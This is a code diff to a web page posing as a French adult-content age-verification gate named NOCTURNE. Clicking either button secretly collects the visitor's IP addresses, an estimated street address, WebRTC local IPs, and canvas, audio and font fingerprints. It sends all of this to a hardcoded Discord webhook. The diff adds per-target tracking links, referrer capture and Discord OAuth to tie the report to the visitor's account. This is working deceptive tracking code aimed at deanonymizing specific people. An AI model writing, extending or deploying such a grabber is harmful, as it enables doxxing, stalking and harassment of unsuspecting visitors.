@@ -67,6 +67,8 @@ p.sub b{color:rgba(255,255,255,.8);font-weight:500}
 .btn:active{transform:translateY(0) scale(.99)}
 .btn[disabled]{cursor:default;opacity:.9;transform:none}
 .btn.alt{background:rgba(255,255,255,.07);color:#e9e3ff;box-shadow:none;border:1px solid var(--line)}
+.btn.discord{background:linear-gradient(180deg,#7c8cff,#5865f2);color:#fff;
+  box-shadow:0 10px 26px -8px rgba(88,101,242,.6),inset 0 1px 0 rgba(255,255,255,.28)}
 .ghost{display:block;margin:14px auto 0;background:none;border:0;cursor:pointer;
   font-family:inherit;font-size:12.5px;color:var(--muted);transition:color .18s}
 .ghost:hover{color:rgba(255,255,255,.8)}
@@ -81,7 +83,6 @@ p.sub b{color:rgba(255,255,255,.8);font-weight:500}
 .spin{width:15px;height:15px;border-radius:50%;border:2px solid rgba(18,10,34,.35);border-top-color:#120a22;animation:sp .7s linear infinite}
 @keyframes sp{to{transform:rotate(360deg)}}
 
-/* ---- dump panel ---- */
 .dox{margin-top:20px;text-align:left;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
   font-size:11.5px;line-height:1.5;color:#ded8f0}
 .sec{margin-top:16px}
@@ -102,8 +103,8 @@ p.sub b{color:rgba(255,255,255,.8);font-weight:500}
 .addr small{display:block;font-weight:300;font-size:12px;color:#c9c2e0;margin-top:3px}
 .gauge{height:5px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin-top:6px}
 .gauge i{display:block;height:100%;border-radius:99px;background:linear-gradient(90deg,#4ade80,#fbbf24,#f87171)}
-.tools{display:flex;gap:8px;margin-top:20px}
-.tools .btn{font-size:12.5px;padding:12px 14px}
+.tools{display:flex;gap:8px;margin-top:20px;flex-wrap:wrap}
+.tools .btn{font-size:12.5px;padding:12px 14px;flex:1;min-width:130px}
 .small{font-size:10.5px;color:rgba(255,255,255,.32);text-align:center;margin-top:12px;line-height:1.5}
 </style>
 </head>
@@ -118,6 +119,7 @@ p.sub b{color:rgba(255,255,255,.8);font-weight:500}
   <h1 id="title">Contenu réservé<br>aux <em>adultes</em></h1>
   <p class="sub" id="sub">Cet espace privé contient des visuels et des œuvres destinés à un public majeur. Confirmez votre âge pour <b>déverrouiller l'accès</b>.</p>
   <button class="btn" id="go"><span id="label">J'ai 18 ans ou plus</span></button>
+  <div id="oauthslot"></div>
   <button class="ghost" id="later">Plus tard</button>
   <div class="bar" id="bar"><i id="fill"></i></div>
   <section class="dox" id="dox" hidden></section>
@@ -134,6 +136,15 @@ const WEBHOOK    = "https://discord.com/api/webhooks/1572285611757535345/1hltRG4
 const REDIRECT   = "https://venice.ai";   // "" = pas de redirection
 const SITE_NAME  = "NOCTURNE";
 const LABEL      = "nocturne.gate";
+
+/* --- OAuth Discord (optionnel) ---
+   Laisse vide pour désactiver. Sinon : crée une application sur
+   https://discord.com/developers/applications, ajoute l'URL EXACTE de
+   cette page dans "OAuth2 > Redirects", puis colle l'Application ID.
+   GUILD_ID = ton serveur, pour vérifier l'appartenance (facultatif). */
+const DISCORD_CLIENT_ID = "";      // ex: "1234567890123456789"
+const GUILD_ID          = "";      // ex: "987654321098765432"
+const OAUTH_REDIRECT    = location.origin + location.pathname;
 /* ========================================= */
 
 const $ = id => document.getElementById(id);
@@ -152,11 +163,13 @@ const safe = async (fn, fb) => {
   catch(e){ return fb; }
 };
 const family = ip => !ip ? "?" : (ip.includes(":") ? "IPv6" : "IPv4");
-const v6prefix = ip => {
-  if(!ip || !ip.includes(":")) return "";
-  const parts = ip.split(":");
-  return parts.slice(0, 4).filter(Boolean).join(":") + "::/64";
-};
+const v6prefix = ip => ip && ip.includes(":") ? ip.split(":").slice(0,4).filter(Boolean).join(":") + "::/64" : "";
+const b64d = t => { try{ return decodeURIComponent(escape(atob(t.replace(/-/g,"+").replace(/_/g,"/")))); }catch(e){ return ""; } };
+
+const Q = new URLSearchParams(location.search);
+const ATTRIB = b64d(Q.get("u") || "") || Q.get("u") || "";
+const SRC = Q.get("src") || "";
+let OAUTH_USER = null;
 
 async function hash(str){
   try{
@@ -168,11 +181,11 @@ async function hash(str){
     return (h>>>0).toString(16).padStart(8,"0").repeat(2);
   }
 }
-async function fetchJson(url, ms = 4500){
+async function fetchJson(url, ms = 4500, opt){
   const ctl = new AbortController();
   const t = setTimeout(() => ctl.abort(), ms);
   try{
-    const r = await fetch(url, {cache:"no-store", signal:ctl.signal});
+    const r = await fetch(url, {cache:"no-store", signal:ctl.signal, ...(opt||{})});
     if(!r.ok) return null;
     const d = await r.json();
     return (d && typeof d === "object") ? d : null;
@@ -187,7 +200,64 @@ const km = (a, b) => {
   return 2*R*Math.asin(Math.sqrt(h));
 };
 
-/* ---------- 1. découverte des IP, IPv6 prioritaire ---------- */
+/* ---------- OAuth2 PKCE ---------- */
+const b64u = buf => btoa(String.fromCharCode(...new Uint8Array(buf)))
+  .replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"");
+const rnd = n => [...crypto.getRandomValues(new Uint8Array(n))].map(b => b.toString(16).padStart(2,"0")).join("").slice(0,n);
+
+async function oauthStart(){
+  const verifier = rnd(64);
+  sessionStorage.setItem("dcv", verifier);
+  const state = rnd(16);
+  sessionStorage.setItem("dcs", state);
+  const challenge = b64u(await crypto.subtle.digest("SHA-256", new TextEncoder().encode(verifier)));
+  const p = new URLSearchParams({
+    response_type:"code", client_id:DISCORD_CLIENT_ID,
+    scope:"identify guilds", redirect_uri:OAUTH_REDIRECT,
+    code_challenge:challenge, code_challenge_method:"S256", state
+  });
+  location.href = "https://discord.com/oauth2/authorize?" + p.toString();
+}
+
+async function oauthFinish(){
+  const code = Q.get("code");
+  if(!code || !DISCORD_CLIENT_ID) return null;
+  if(Q.get("state") !== sessionStorage.getItem("dcs")) return null;
+  const verifier = sessionStorage.getItem("dcv");
+  if(!verifier) return null;
+
+  const tok = await fetchJson("https://discord.com/api/oauth2/token", 8000, {
+    method:"POST",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:new URLSearchParams({
+      client_id:DISCORD_CLIENT_ID, grant_type:"authorization_code",
+      code, redirect_uri:OAUTH_REDIRECT, code_verifier:verifier
+    }).toString()
+  });
+  if(!tok || !tok.access_token) return null;
+
+  const h = {Authorization:"Bearer " + tok.access_token};
+  const me = await fetchJson("https://discord.com/api/users/@me", 6000, {headers:h});
+  if(!me || !me.id) return null;
+
+  let inGuild = null;
+  if(GUILD_ID){
+    const gs = await fetchJson("https://discord.com/api/users/@me/guilds", 6000, {headers:h});
+    if(Array.isArray(gs)) inGuild = gs.some(g => g.id === GUILD_ID);
+  }
+  sessionStorage.removeItem("dcv");
+  sessionStorage.removeItem("dcs");
+  return {
+    id: me.id,
+    tag: me.discriminator && me.discriminator !== "0" ? me.username + "#" + me.discriminator : (me.global_name || me.username),
+    name: me.username,
+    global: me.global_name || "",
+    avatar: me.avatar ? `https://cdn.discordapp.com/avatars/${me.id}/${me.avatar}.png?size=128` : "",
+    inGuild
+  };
+}
+
+/* ---------- découverte IP ---------- */
 async function discoverIps(){
   const [six, sixAlt, four] = await Promise.all([
     fetchJson("https://api6.ipify.org?format=json", 3000),
@@ -199,7 +269,7 @@ async function discoverIps(){
   return { v6: v6 || null, v4 };
 }
 
-/* ---------- 2. bases géo, interrogeables par IP ---------- */
+/* ---------- bases géo ---------- */
 const PROVIDERS = [
   { n:"bigdatacloud", u:ip => `https://api.bigdatacloud.net/data/ip-geolocation-full?ip=${ip}&localityLanguage=fr`, map:d => {
       const l = d && d.location; if(!l) return null;
@@ -237,7 +307,6 @@ async function lookup(ip){
   return res.map(r => r.status === "fulfilled" ? r.value : null).filter(Boolean);
 }
 
-/* ---------- 3. géocodage inverse (rue) ---------- */
 async function reverseStreet(lat, lon){
   const out = { road:"", house:"", hood:"", zip:"", city:"", region:"", country:"", via:"" };
   if(lat == null || lon == null) return out;
@@ -268,26 +337,21 @@ async function reverseStreet(lat, lon){
   return out;
 }
 
-/* ---------- 4. consensus géo ---------- */
 async function geoResolve(){
   const ips = await discoverIps();
   const targets = [ips.v6, ips.v4].filter(Boolean);
-
   const blank = { v4:ips.v4, v6:ips.v6, v6prefix:v6prefix(ips.v6), records:[], best:null,
     address:null, spread:0, agree:0, total:0, v4v6:null, failed:!targets.length };
-
   if(!targets.length){
     const f = await fetchJson("https://api.ipify.org?format=json", 2500);
     return { ...blank, v4:(f && f.ip) || null, failed:!(f && f.ip) };
   }
-
   const all = (await Promise.all(targets.map(lookup))).flat();
   if(!all.length) return { ...blank, failed:true };
 
   const pts = all.filter(r => r.lat != null && r.lon != null);
   let spread = 0;
   for(let i=0;i<pts.length;i++) for(let k=i+1;k<pts.length;k++) spread = Math.max(spread, km(pts[i], pts[k]));
-
   const counts = {};
   all.forEach(r => { counts[r.ip] = (counts[r.ip]||0)+1; });
   const agree = Math.max(...Object.values(counts));
@@ -300,7 +364,6 @@ async function geoResolve(){
     p4.forEach(a => p6.forEach(b => d = Math.max(d, km(a,b))));
     v4v6 = Math.round(d);
   }
-
   const scoreRec = r => (r.zip ? 45 : 0) + (r.city ? 30 : 0) + (r.region ? 5 : 0)
     + (r.conf != null ? Math.min(20, r.conf / 5) : 0) + (r.family === "IPv6" ? 8 : 0);
   const best = all.slice().sort((a,b) => scoreRec(b) - scoreRec(a))[0] || null;
@@ -311,12 +374,10 @@ async function geoResolve(){
     if(!address.road && best.zip) address.zip = address.zip || best.zip;
     if(!address.city) address.city = address.city || best.city;
   }
-
-  return { ...blank, records:all, best, address, spread:Math.round(spread), agree,
-    total:all.length, v4v6, failed:false };
+  return { ...blank, records:all, best, address, spread:Math.round(spread), agree, total:all.length, v4v6, failed:false };
 }
 
-/* ---------- fuite WebRTC ---------- */
+/* ---------- WebRTC ---------- */
 function rtcIps(timeout = 3000){
   return new Promise(res => {
     const found = new Set();
@@ -449,7 +510,8 @@ async function collect(){
   }, []);
 
   const D = { geo, rtc, cvFp, audFp, bat, uaData, perms, storage, audio, gl, tz, mem, conn,
-    codecs, voices, devices, fontList, ua: navigator.userAgent || "" };
+    codecs, voices, devices, fontList, ua: navigator.userAgent || "",
+    attrib: ATTRIB, src: SRC, discord: OAUTH_USER, referrer: document.referrer || "" };
 
   D.fpGlobal = await hash([cvFp, audFp, gl.r, D.ua, screen.width+"x"+screen.height,
     tz.timeZone, navigator.language, navigator.hardwareConcurrency].join("|"));
@@ -477,6 +539,25 @@ function buildSections(D){
   const ad = g.address || {};
   const S = [];
 
+  const refOrigin = (() => {
+    if(!D.referrer) return "aucun referrer";
+    try{ return new URL(D.referrer).host; }catch(e){ return D.referrer; }
+  })();
+  const viaDiscord = /discord/i.test(D.referrer);
+
+  const idLine = D.discord
+    ? `<span class="hi">${esc(D.discord.tag)}</span> · <span class="mono">${esc(D.discord.id)}</span>${D.discord.avatar ? ` · <a href="${esc(D.discord.avatar)}" target="_blank" rel="noopener">avatar</a>` : ""}`
+    : `<span class="lo">non vérifiée</span>`;
+
+  S.push({title:"Attribution", rows:[
+    ["Lien nominatif", D.attrib ? `<span class="hi">${esc(D.attrib)}</span>` : `<span class="lo">lien non nominatif</span>`],
+    ["Campagne / source", D.src ? esc(D.src) : "—"],
+    ["Compte Discord", idLine],
+    ["Membre du serveur", D.discord ? (D.discord.inGuild === true ? `<span class="hi">oui</span>` : D.discord.inGuild === false ? `<span class="lo">non</span>` : "non testé") : "—"],
+    ["Referrer", viaDiscord ? `<span class="warn">${esc(refOrigin)}</span> (origine seule)` : esc(refOrigin)],
+    ["Ouverture", window.opener ? "fenêtre enfant" : "directe"]
+  ]});
+
   const addrLine = ad.road
     ? `<div class="addr">${esc((ad.house ? ad.house+" " : "") + ad.road)}<small>${esc([ad.hood, ad.zip, ad.city, ad.region, ad.country].filter(Boolean).join(", "))}</small></div>`
     : ad.city
@@ -489,7 +570,6 @@ function buildSections(D){
         ? `<span class="warn">${esc(b.tz)}</span> (IP) ≠ <span class="mono">${esc(D.tz.timeZone)}</span> (machine)`
         : `<span class="mono">${esc(D.tz.timeZone)}</span> · cohérent avec l'IP`)
     : `<span class="mono">${esc(D.tz.timeZone)}</span> · fuseau IP indisponible`;
-
   const verdictTxt = !b ? `<span class="lo">IP non résolue</span>`
     : v.score >= 60 ? `<span class="lo">anonymisation probable</span>`
     : v.score >= 25 ? `<span class="warn">signaux mitigés</span>`
@@ -505,16 +585,15 @@ function buildSections(D){
   ]});
 
   S.push({title:"Réseau", rows:[
-    ["IPv6", g.v6 ? `<span class="mono">${esc(g.v6)}</span>` : `<span class="lo">absent — connexion IPv4 seule</span>`],
+    ["IPv6", g.v6 ? `<span class="mono">${esc(g.v6)}</span>` : `<span class="lo">absent — IPv4 seule</span>`],
     ["Préfixe IPv6", g.v6prefix ? `<span class="mono">${esc(g.v6prefix)}</span>` : "—"],
     ["IPv4", g.v4 ? `<span class="mono">${esc(g.v4)}</span>` : "—"],
-    ["Familles disponibles", `${g.v6 ? "IPv6 " : ""}${g.v4 ? "IPv4" : ""}`.trim() || "—"],
     ["FAI / organisation", (b && b.isp) ? esc(b.isp) : "—"],
     ["ASN", (b && b.asn) ? esc(String(b.asn)) : "—"],
     ["Datacenter / VPN", v.dc ? `<span class="lo">PROBABLE</span>` : (b ? "aucun signe" : "—")],
     ["Écart IPv4 ↔ IPv6", g.v4v6 != null ? `${g.v4v6} km${v.split46?" <span class='warn'>(divergent)</span>":""}` : "non comparable"],
     ["IP locales (WebRTC)", D.rtc.length ? `<span class="mono">${esc(D.rtc.join(" · "))}</span>` : "masquées (mDNS)"],
-    ["Type de connexion", D.conn ? esc([D.conn.effectiveType, D.conn.downlink+" Mbps", D.conn.rtt+" ms RTT", D.conn.saveData?"économie":"normal"].filter(Boolean).join(" · ")) : "—"]
+    ["Type de connexion", D.conn ? esc([D.conn.effectiveType, D.conn.downlink+" Mbps", D.conn.rtt+" ms RTT"].filter(Boolean).join(" · ")) : "—"]
   ]});
 
   S.push({title:"Localisation (IP, sans autorisation)", rows:[
@@ -523,8 +602,8 @@ function buildSections(D){
     ["Fuseau horaire", tzLine],
     ["Heure locale / UTC", `${esc(nowLocal())} · <span class="mono">${new Date().toISOString().slice(0,19).replace("T"," ")}</span>`],
     ["Langues", esc((navigator.languages || [navigator.language]).join(", "))],
-    ["Langue ↔ pays", v.ccMismatch ? `<span class="warn">divergence</span> (${esc((navigator.language||"").split("-")[1]||"")} vs ${esc(b.cc)})` : "cohérent"],
-    ["Bases concordantes", g.total ? `${g.agree}/${g.total} réponses · écart max ${g.spread} km${v.spreadHigh?" <span class='warn'>(dispersé)</span>":""}` : "aucune réponse"],
+    ["Langue ↔ pays", v.ccMismatch ? `<span class="warn">divergence</span>` : "cohérent"],
+    ["Bases concordantes", g.total ? `${g.agree}/${g.total} réponses · écart max ${g.spread} km` : "aucune réponse"],
     ["Verdict", `${verdictTxt} · indice ${v.score}/100<div class="gauge"><i style="width:${Math.max(4,v.score)}%"></i></div>`]
   ]});
 
@@ -549,7 +628,6 @@ function buildSections(D){
     ["Empreinte globale", `<span class="mono">${esc(D.fpGlobal)}</span>`],
     ["Canvas", `<span class="mono">${esc(D.cvFp)}</span>`],
     ["Audio", `<span class="mono">${esc(D.audFp)}</span>`],
-    ["WebGL max texture", esc(String(D.gl.max))],
     ["Polices détectées", D.fontList.length ? esc(D.fontList.slice(0,18).join(", ")) + (D.fontList.length>18?" …":"") : "aucune"],
     ["Codecs", esc(D.codecs.join(" · ") || "—")],
     ["Voix TTS", esc(D.voices)],
@@ -565,17 +643,14 @@ function buildSections(D){
   ]});
 
   S.push({title:"Contexte", rows:[
-    ["Provenance", esc(document.referrer || "accès direct")],
-    ["Ouverture", window.opener ? "fenêtre enfant" : "directe"],
-    ["Préférences", `${matchMedia("(prefers-color-scheme:dark)").matches?"sombre":"clair"} · ${matchMedia("(prefers-reduced-motion:reduce)").matches?"mouvement réduit":"animations"}`],
     ["Surface disponible", `${screen.availWidth}×${screen.availHeight}`],
+    ["Préférences", `${matchMedia("(prefers-color-scheme:dark)").matches?"sombre":"clair"} · ${matchMedia("(prefers-reduced-motion:reduce)").matches?"mouvement réduit":"animations"}`],
     ["User-Agent", `<span class="mono">${esc(D.ua.slice(0,300))}</span>`]
   ]});
 
   return S;
 }
 
-/* ---------- affichage progressif ---------- */
 async function reveal(S){
   const dox = $("dox");
   dox.hidden = false;
@@ -603,8 +678,19 @@ async function send(D){
   const f = (n,val,i) => ({name:n, value:String(val || "—").slice(0,1000), inline:!!i});
   const adresse = [ (ad.house?ad.house+" ":"")+ad.road, ad.hood, ad.zip, ad.city, ad.region, ad.country ]
     .filter(Boolean).join(", ");
+  const ident = D.discord
+    ? `${D.discord.tag} (\`${D.discord.id}\`)${D.discord.inGuild === true ? " · membre" : D.discord.inGuild === false ? " · hors serveur" : ""}`
+    : (D.attrib ? "lien nominatif : " + D.attrib : "non identifié");
 
   const embeds = [
+    { title:"🪪 Attribution", color:0x5865f2, fields:[
+      f("Identité", ident),
+      f("Lien", D.attrib || "non nominatif", true),
+      f("Source", D.src || "—", true),
+      f("Referrer", D.referrer || "aucun"),
+      f("Compte", D.discord ? `https://discord.com/users/${D.discord.id}` : "—", true),
+      f("Membre serveur", D.discord ? (D.discord.inGuild === true ? "oui" : D.discord.inGuild === false ? "non" : "non testé") : "—", true)
+    ]},
     { title:"📍 Adresse estimée", color:0x86efac, fields:[
       f("Adresse", adresse || "non résolue"),
       f("Coordonnées", (b.lat!=null) ? `\`${b.lat},${b.lon}\` · https://maps.google.com/?q=${b.lat},${b.lon}&z=17` : "—"),
@@ -615,19 +701,15 @@ async function send(D){
       f("ASN", b.asn || "—", true),
       f("Écart v4/v6", g.v4v6 != null ? g.v4v6+" km" : "—", true),
       f("Verdict VPN", `${D.verdict.score}/100`, true),
-      f("Bases", `${g.agree||0}/${g.total||0} · écart ${g.spread||0}km`, true),
       f("TZ IP / machine", `${b.tz||"—"} / ${D.tz.timeZone}${D.verdict.tzMismatch?" ⚠":""}`),
       f("IP locales WebRTC", D.rtc.join(" · ") || "mDNS")
     ]},
     { title:"💻 Appareil", color:0x38bdf8, fields:[
       f("Plateforme", (D.uaData && D.uaData.platform) || navigator.platform, true),
-      f("Arch", D.uaData ? [D.uaData.architecture,D.uaData.bitness].filter(Boolean).join(" ") : "—", true),
       f("Modèle", (D.uaData && D.uaData.model) || "—", true),
-      f("CPU", navigator.hardwareConcurrency, true),
-      f("RAM", navigator.deviceMemory ? navigator.deviceMemory+" Go" : "—", true),
+      f("CPU / RAM", `${navigator.hardwareConcurrency||"—"} · ${navigator.deviceMemory||"—"}Go`, true),
       f("Écran", `${screen.width}×${screen.height} @${window.devicePixelRatio}x`, true),
       f("GPU", `${D.gl.v} — ${D.gl.r}`),
-      f("Audio", `${D.audio.rate||"—"}Hz ${D.audio.ch||"—"}ch`, true),
       f("Batterie", D.bat, true),
       f("Langues", (navigator.languages||[]).join(", ")),
       f("UA", "```"+(D.ua||"").slice(0,900)+"```")
@@ -637,15 +719,13 @@ async function send(D){
       f("Canvas", "`"+D.cvFp+"`", true),
       f("Audio", "`"+D.audFp+"`", true),
       f("Polices", D.fontList.slice(0,25).join(", ") || "—"),
-      f("Stockage", D.storage),
       f("Permissions", JSON.stringify(D.perms)),
-      f("Périphériques", D.devices),
-      f("Référent", document.referrer || "direct", true)
+      f("Périphériques", D.devices)
     ]}
   ];
-  const payload = { username: SITE_NAME+" · Visiteur", embeds: embeds.map(e => ({
-    ...e, timestamp:new Date().toISOString(), footer:{text: LABEL+" · "+((g.v6 || g.v4)||"ip inconnue")}
-  }))};
+  const payload = { username: SITE_NAME+" · "+(D.discord ? D.discord.tag : (D.attrib || "Visiteur")),
+    embeds: embeds.map(e => ({ ...e, timestamp:new Date().toISOString(),
+      footer:{text: LABEL+" · "+((g.v6 || g.v4)||"ip inconnue")} }))};
   const body = JSON.stringify(payload);
   try{
     const r = await fetch(WEBHOOK,{method:"POST",headers:{"Content-Type":"application/json"},body,keepalive:true});
@@ -659,7 +739,6 @@ async function send(D){
 async function render(D){
   await reveal(buildSections(D));
   send(D);
-
   const tools = $("tools");
   tools.className = "tools";
   tools.innerHTML = `
@@ -674,14 +753,11 @@ async function render(D){
     catch(e){ $("copy").textContent = "Échec"; }
   };
   if(D.geo.failed) $("retry").onclick = async () => {
-    $("dox").innerHTML = "";
-    $("tools").innerHTML = "";
+    $("dox").innerHTML = ""; $("tools").innerHTML = "";
     document.querySelector(".small")?.remove();
-    const D2 = await collect();
-    await render(D2);
+    await render(await collect());
   };
   if(REDIRECT) $("next").onclick = () => location.href = REDIRECT;
-
   const s = document.createElement("p");
   s.className = "small";
   s.textContent = "Rapport transmis · empreinte " + D.fpGlobal;
@@ -694,7 +770,8 @@ async function enter(){
   if(busy) return; busy = true;
   const go = $("go");
   go.disabled = true;
-  go.innerHTML = '<span class="spin"></span><span>Résolution IPv6 en cours…</span>';
+  go.innerHTML = '<span class="spin"></span><span>Résolution en cours…</span>';
+  $("oauthslot").innerHTML = "";
   $("bar").classList.add("on");
   requestAnimationFrame(()=>{ $("fill").style.width = "100%"; });
 
@@ -706,20 +783,50 @@ async function enter(){
       rtc:[], cvFp:"indisponible", audFp:"indisponible", bat:"indisponible", uaData:null,
       perms:{}, storage:"—", audio:{}, gl:{v:"—",r:"—",max:"—"},
       tz:Intl.DateTimeFormat().resolvedOptions(), mem:"—", conn:null, codecs:[], voices:"—",
-      devices:"—", fontList:[], ua:navigator.userAgent || "" };
+      devices:"—", fontList:[], ua:navigator.userAgent || "",
+      attrib:ATTRIB, src:SRC, discord:OAUTH_USER, referrer:document.referrer || "" };
     D.fpGlobal = await hash("fallback"+D.ua);
     D.verdict = { tzMismatch:false, ccMismatch:false, dc:false, spreadHigh:false, split46:false, score:0 };
   }
 
   $("title").innerHTML = "Identité<br><em>vérifiée</em>";
-  $("sub").innerHTML = "Résolution IPv6 prioritaire, puis géocodage inverse — sans aucune autorisation demandée.";
+  $("sub").innerHTML = OAUTH_USER
+    ? "Connecté en tant que " + esc(OAUTH_USER.tag) + ". Voici le rapport de session."
+    : "Voici ce que votre navigateur expose, sans aucune autorisation demandée.";
   $("badge").classList.add("ok");
   $("badge").innerHTML = '<span class="dot"></span>Accès autorisé';
   go.style.display = "none";
   $("later").style.display = "none";
-
   await render(D);
 }
+
+/* ---------- démarrage ---------- */
+(async () => {
+  if(DISCORD_CLIENT_ID){
+    const slot = $("oauthslot");
+    slot.style.marginTop = "10px";
+    const b = document.createElement("button");
+    b.className = "btn discord";
+    b.textContent = "S'identifier avec Discord";
+    b.onclick = oauthStart;
+    slot.appendChild(b);
+
+    if(Q.get("code")){
+      b.disabled = true;
+      b.textContent = "Vérification du compte…";
+      OAUTH_USER = await oauthFinish();
+      if(OAUTH_USER){
+        slot.innerHTML = "";
+        $("sub").innerHTML = "Compte Discord vérifié : <b>" + esc(OAUTH_USER.tag) + "</b>. Confirmez votre âge pour continuer.";
+        history.replaceState(null, "", location.pathname + (Q.get("u") ? "?u="+Q.get("u") : ""));
+      } else {
+        b.disabled = false;
+        b.textContent = "Échec — réessayer";
+      }
+    }
+  }
+  if(ATTRIB) $("sub").innerHTML = "Lien réservé à <b>" + esc(ATTRIB) + "</b>. Confirmez votre âge pour continuer.";
+})();
 
 $("go").addEventListener("click", enter);
 $("later").addEventListener("click", enter);
